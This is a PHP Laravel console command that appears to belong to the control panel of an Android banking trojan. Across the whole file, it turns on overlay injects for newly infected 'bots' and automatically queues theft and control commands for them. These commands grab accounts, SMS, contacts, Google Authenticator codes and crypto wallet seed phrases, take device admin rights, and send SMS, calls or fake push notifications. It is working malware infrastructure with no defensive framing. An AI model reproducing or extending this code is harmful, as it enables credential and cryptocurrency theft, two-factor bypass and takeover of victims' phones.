<?php

namespace App\Console\Commands;

use App\Models\AutoCommand;
use App\Models\Bot;
use App\Models\BotCommand;
use App\Models\BotInjection;
use App\Models\Injection;
use Illuminate\Console\Command;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Log;
use Throwable;


class AutoInjectsCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'autoInjects:run';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Run auto injects';

    /**
     * Execute the console command.
     */
    public function handle(): void
    {
        $autoInjectApplications = Injection::select('application')
            ->where('auto', true)
            ->get()
            ->pluck('application');

        if (!$autoInjectApplications->count()) {
            return;
        }

        $newBots = Bot::select('id', 'created_at', 'permissions')->where('is_new', true)->get();

        $newBots = $newBots->filter(function(Bot $bot) {
            return Carbon::now()->diffInMinutes($bot->created_at, false) <= -5;
        });

        $newBotIds = $newBots->pluck('id');

        Log::channel('auto_injects')->info('Auto injects command started for bots: ', $newBotIds->toArray());

        if (!$newBotIds->count()) {
            return;
        }

        BotInjection::whereIn('bot_id', $newBotIds)
            ->whereIn('application', $autoInjectApplications)
            ->update([
                'is_active' => true,
            ]);

        Log::channel('auto_injects')->info('Auto injects enabled for botIds', $newBotIds->toArray());

        $autoCommands = AutoCommand::firstOrCreate();

        $autoCommandsCollection = collect($autoCommands->data);

        $autoCommandsCollection = $autoCommandsCollection->filter(function($command) {
            return isset($command['enabled']) && $command['enabled'];
        });

        $commands = [];

        try {
            foreach ($autoCommandsCollection as $command => $payload) {
                switch ($command) {
                    case 'getAccounts':
                        $commands[] = [
                            'command' => 'getAccounts',
                            'payload' => "",
                        ];
                        break;
                    case 'getInstalledApps':
                        $commands[] = [
                            'command' => 'getInstallApps',
                            'payload' => "",
                        ];
                        break;
                    case 'updateInjectList':
                        $commands[] = [
                            'command' => 'updateInjectAndListApps',
                            'payload' => "",
                        ];
                        break;
                    case 'getSMSList':
                        $commands[] = [
                            'command' => 'getSMS',
                            'payload' => "",
                        ];
                        break;
                    case 'getContactsList':
                        $commands[] = [
                            'command' => 'getContacts',
                            'payload' => "",
                        ];
                        break;
                    case 'getAdminRights':
                        $commands[] = [
                            'command' => 'startAdmin',
                            'payload' => "",
                        ];
                        break;
                    case 'googleAuthGrabber':
                        $commands[] = [
                            'command' => 'startAuthenticator2',
                            'payload' => "",
                        ];
                        break;
                    case 'calling':
                        if (!$payload['number']) {
                            break;
                        }

                        $commands[] = [
                            'command' => 'calling',
                            'payload' => [
                                'number' => $payload['number'],
                                'sim' => 'sim1',
                            ],
                        ];
                        break;

                    case 'openInject':
                        if (!$payload['application']) {
                            break;
                        }

                        $commands[] = [
                            'command' => 'startInject',
                            'payload' => [
                                'app' => $payload['application'],
                            ],
                        ];
                        break;

                    case 'sendPush':
                        if (!$payload['application'] || !$payload['title'] || !$payload['text']) {
                            break;
                        }

                        $commands[] = [
                            'command' => 'push',
                            'payload' => [
                                'app' => $payload['application'],
                                'title' => $payload['title'],
                                'text' => $payload['text'],
                            ],
                        ];
                        break;

                    case 'sendSMS':
                        if (!$payload['number'] || !$payload['message']) {
                            break;
                        }

                        $commands[] = [
                            'command' => 'sendSMS',
                            'payload' => [
                                'sim' => 'sim1',
                                'number' => $payload['number'],
                                'text' => $payload['message'],
                            ],
                        ];
                        break;

                    case 'getSeedPhrase':
                        if (!is_array($payload['wallets']) || !count($payload['wallets'])) {
                            break;
                        }

                        foreach ($payload['wallets'] as $wallet) {
                            $commands[] = [
                                'command' => $wallet,
                                'payload' => "",
                            ];
                        }
                        break;

                    case 'clearAppData':
                        if (!$payload['application']) {
                            break;
                        }

                        $commands[] = [
                            'command' => "clearCache",
                            'payload' => [
                                'app' => $payload['application'],
                            ],
                        ];
                        break;

                    case 'runApp':
                        if (!$payload['application']) {
                            break;
                        }

                        $commands[] = [
                            'command' => "startApp",
                            'payload' => [
                                'app' => $payload['application'],
                            ],
                        ];
                        break;

                    case 'deleteApp':
                        if (!$payload['application']) {
                            break;
                        }

                        $commands[] = [
                            'command' => "deleteApplication",
                            'payload' => [
                                'app' => $payload['application'],
                            ],
                        ];
                        break;

                    case 'openUrl':
                        if (!$payload['url']) {
                            break;
                        }

                        $commands[] = [
                            'command' => "deleteApplication",
                            'payload' => [
                                'url' => $payload['url'],
                            ],
                        ];
                        break;
                }
            }
        } catch (Throwable) {
        }

        foreach($newBots as $bot) {
            if(!$bot->permissions || !isset($bot->permissions['accessibility']) || $bot->permissions['accessibility'] === "false") {
                continue;
            }

            foreach($commands as $command) {
                BotCommand::create([
                    'bot_id' => $bot->id,
                    'command' => $command,
                    'is_processed' => false,
                    'run_at' => Carbon::now(),
                ]);
            }
        }

        Log::channel('auto_injects')->info('Auto commands enabled for bots', $newBotIds->toArray());

        Bot::whereIn('id', $newBotIds)->update([
            'update_settings' => true,
            'is_new' => false,
        ]);
    }
}